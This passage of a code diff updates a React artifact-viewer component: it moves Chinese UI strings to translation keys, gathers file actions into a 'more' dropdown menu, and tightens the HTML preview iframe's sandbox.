               className="artifact-icon-btn"
@@ -333,53 +882,69 @@ function ArtifactViewer({
                 await onReload();
                 setReloadKey((k) => k + 1);
               }}
-              aria-label="重新加载预览"
-              title="重新加载"
+              aria-label={t("rail.reload_preview")}
+              title={t("rail.reload")}
             >
               <Icon name="refresh" size={16} />
             </button>
           )}
-          {isApp && (
+          <div className="artifact-menu-wrap" ref={menuRef}>
             <button
               className="artifact-icon-btn"
-              onClick={() => revealArtifact(sessionId, artifact.path, "open")}
-              aria-label="用默认应用打开"
-              title="用默认应用打开"
+              data-testid="artifact-more"
+              aria-label={t("rail.more_actions")}
+              title={t("rail.more")}
+              onClick={() => setMenuOpen((v) => !v)}
             >
-              <Icon name="panelOpen" size={16} />
+              <Icon name="moreHorizontal" size={16} />
             </button>
-          )}
-          {/* Copy the ABSOLUTE path — the workspace-relative one is useless outside the app
-              (tester catch 2026-07-12: it copied just "slack-connector-debug.md"). */}
+            {menuOpen && (
+              <div className="artifact-menu" data-testid="artifact-menu">
+                {copyableText &&
+                  item("artifact-copy-contents", "copy", t("rail.copy_contents"), () =>
+                    navigator.clipboard?.writeText(content?.content || ""),
+                  )}
+                {item("artifact-copy-path", "file", t("rail.copy_path"), () =>
+                  navigator.clipboard?.writeText(artifact.abs_path || artifact.path),
+                )}
+                <div className="artifact-menu-div" />
+                {isHtml &&
+                  item("artifact-open-browser", "panelOpen", t("rail.open_in_browser"), () =>
+                    revealArtifact(sessionId, artifact.path, "open"),
+                  )}
+                {isApp &&
+                  item("artifact-open-app", "panelOpen", t("rail.open_in_default"), () =>
+                    revealArtifact(sessionId, artifact.path, "open"),
+                  )}
+                {item("artifact-reveal", "folder", t("rail.reveal_in_finder"), () =>
+                  revealArtifact(sessionId, artifact.path, "reveal"),
+                )}
+              </div>
+            )}
+          </div>
           <button
             className="artifact-icon-btn"
-            onClick={() => navigator.clipboard?.writeText(artifact.abs_path || artifact.path)}
-            aria-label="复制路径"
-            title="复制完整路径"
+            data-testid="artifact-close"
+            onClick={onBack}
+            aria-label={t("rail.close_viewer")}
+            title={t("rail.close")}
           >
-            <Icon name="copy" size={16} />
-          </button>
-          <button
-            className="artifact-icon-btn"
-            onClick={() => revealArtifact(sessionId, artifact.path, "reveal")}
-            aria-label="在文件夹中显示"
-            title="在文件夹中显示"
-          >
-            <Icon name="folder" size={16} />
+            <Icon name="x" size={16} />
           </button>
         </div>
       </div>
       <div className="artifact-preview">
-          {!content ? (
-          <div className="rail-muted">加载中…</div>
+        {!content ? (
+          <div className="rail-muted">{t("rail.loading")}</div>
         ) : content.error ? (
           <div className="rail-error">{content.error}</div>
         ) : content.kind === "html" ? (
           <iframe
             key={`${artifact.path}-${reloadKey}`}
-            sandbox="allow-scripts allow-same-origin"
+            sandbox="allow-scripts"
             className="artifact-frame"
-            srcDoc={content.content || ""}
+            data-testid="artifact-frame"
+            srcDoc={sandboxHtml(content.content || "")}
           />
         ) : content.kind === "markdown" ? (
           <div className="artifact-md">
@@ -407,14 +972,14 @@ function ArtifactViewer({
                 {!e.dir && <span className="artifact-folder-size">{formatBytes(e.size)}</span>}
               </button>
             ))}
-            {!content.entries?.length && <div className="rail-muted">This folder is empty.</div>}
+            {!content.entries?.length && <div className="rail-muted">{t("rail.folder_empty")}</div>}
           </div>
         ) : content.kind === "office" ? (
           <div className="artifact-open-prompt">
             <Icon name="panelOpen" size={28} />
-            <p>此 {/\.pptx?$/i.test(artifact.name) ? "PowerPoint" : "Word"} 文件无法在此处预览。</p>
+            <p>{t("rail.office_no_preview", { type: /\.pptx?$/i.test(artifact.name) ? "PowerPoint" : "Word" })}</p>
             <button className="btn sm" onClick={() => revealArtifact(sessionId, artifact.path, "open")}>
-              用默认应用打开
+              {t("rail.open_in_default")}
             </button>
           </div>
         ) : (
@@ -428,6 +993,7 @@ function ArtifactViewer({
 const MAX_TABLE_ROWS = 500;
 
 function GridTable({ rows, note }: { rows: unknown[][]; note?: string }) {
+  const { t } = useTranslation();
   const [head, ...body] = rows;
   return (
     <div className="artifact-tablewrap">
@@ -446,7 +1012,7 @@ function GridTable({ rows, note }: { rows: unknown[][]; note?: string }) {
       {(note || body.length > MAX_TABLE_ROWS) && (
         <div className="rail-muted artifact-table-note">
           {note}
-          {body.length > MAX_TABLE_ROWS ? ` 显示前 ${MAX_TABLE_ROWS} 行，共 ${body.length} 行。` : ""}
+          {body.length > MAX_TABLE_ROWS ? ` ${t("rail.table_truncated", { max: MAX_TABLE_ROWS, total: body.length })}` : ""}
         </div>
       )}
     </div>
@@ -489,8 +1055,9 @@ function parseCsv(text: string): string[][] {
 }
 
 function CsvTable({ text }: { text: string }) {
+  const { t } = useTranslation();
   const rows = parseCsv(text);
-  if (!rows.length) return <div className="rail-muted artifact-table-note">空文件。</div>;
+  if (!rows.length) return <div className="rail-muted artifact-table-note">{t("rail.empty_file")}</div>;
   return <GridTable rows={rows} />;
 }
 
@@ -499,6 +1066,7 @@ function CsvTable({ text }: { text: string }) {
 // WKWebView has no inline PDF plugin (<embed> shows a gray pane in the Tauri shell), so we
 // rasterize pages with pdf.js onto stacked canvases — same lazy-chunk pattern as SheetViewer.
 function PdfViewer({ dataUrl }: { dataUrl: string }) {
+  const { t } = useTranslation();
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(true);
   const holder = useRef<HTMLDivElement | null>(null);
@@ -538,16 +1106,17 @@ function PdfViewer({ dataUrl }: { dataUrl: string }) {
     };
   }, [dataUrl]);
 
-  if (error) return <div className="rail-error artifact-table-note">无法渲染 PDF：{error}</div>;
+  if (error) return <div className="rail-error artifact-table-note">{t("rail.pdf_error", { error })}</div>;
   return (
     <div className="artifact-pdfjs">
-      {loading && <div className="rail-muted artifact-table-note">正在渲染 PDF…</div>}
+      {loading && <div className="rail-muted artifact-table-note">{t("rail.pdf_rendering")}</div>}
       <div ref={holder} />
     </div>
   );
 }
 
 function SheetViewer({ dataUrl }: { dataUrl: string }) {
+  const { t } = useTranslation();
   const [sheets, setSheets] = useState<{ name: string; rows: unknown[][] }[] | null>(null);
   const [error, setError] = useState("");
   const [active, setActive] = useState(0);
@@ -575,8 +1144,8 @@ function SheetViewer({ dataUrl }: { dataUrl: string }) {
     };
   }, [dataUrl]);
 
-  if (error) return <div className="rail-error artifact-table-note">无法解析表格：{error}</div>;
-  if (!sheets) return <div className="rail-muted artifact-table-note">正在解析表格…</div>;
+  if (error) return <div className="rail-error artifact-table-note">{t("rail.sheet_error", { error })}</div>;
+  if (!sheets) return <div className="rail-muted artifact-table-note">{t("rail.sheet_parsing")}</div>;
   const sheet = sheets[active];
   return (
     <div className="sheet-viewer">
@@ -589,7 +1158,7 @@ function SheetViewer({ dataUrl }: { dataUrl: string }) {
           ))}
         </div>
       )}
-      {sheet.rows.length ? <GridTable rows={sheet.rows} /> : <div className="rail-muted artifact-table-note">空表格。</div>}
+      {sheet.rows.length ? <GridTable rows={sheet.rows} /> : <div className="rail-muted artifact-table-note">{t("rail.sheet_empty")}</div>}
     </div>
   );
 }
